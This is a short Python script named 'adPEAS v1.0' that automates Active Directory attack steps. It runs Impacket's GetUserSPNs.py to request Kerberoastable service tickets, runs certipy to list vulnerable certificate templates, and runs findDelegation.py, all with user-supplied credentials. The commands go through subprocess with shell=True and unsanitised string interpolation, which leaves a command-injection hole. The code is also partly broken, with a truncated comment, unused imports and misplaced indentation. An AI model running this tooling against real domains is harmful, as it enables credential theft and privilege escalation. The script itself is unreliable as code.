import subprocess
from ldap3 import Server, Connection, SUBTREE

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controlle
            cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
            subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")

def certipy(username, password, domain, dc_ip):
     try:
          cmd = f"certipy-ad find -u {username}@{domain} -p {password} -dc-ip {dc_ip} -enabled -vulnerable"
          subprocess.run(cmd, shell=True)
     except Exception as e:
        print(f"Error while running Certipy: {e}")

def findDelegation(username, password, domain, dc_ip):
     try:
          cmd = f"findDelegation.py -dc-ip {dc_ip} {domain}/{username}:{password}"
          subprocess.run(cmd, shell=True)
     except Exception as e:
          print(f"Error while finding delegation: {e}")

# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

print("Welcome to adPEAS v1.0!")
print("Attempting to kerberoast the domain...")
find_and_kerberoast_objects(username, password, domain, dc_ip)
print("Kerberoasting done!")
print("Attempting to find all ADCS infrastructure...")
certipy(username, password, domain, dc_ip)
print("Done finding all ADCS infrastructure")
print("Attempting to find all delegation...")
findDelegation(username, password, domain, dc_ip)
print("Done finding all delegation.")
#todo: auto open certipy output and grep for ESCs 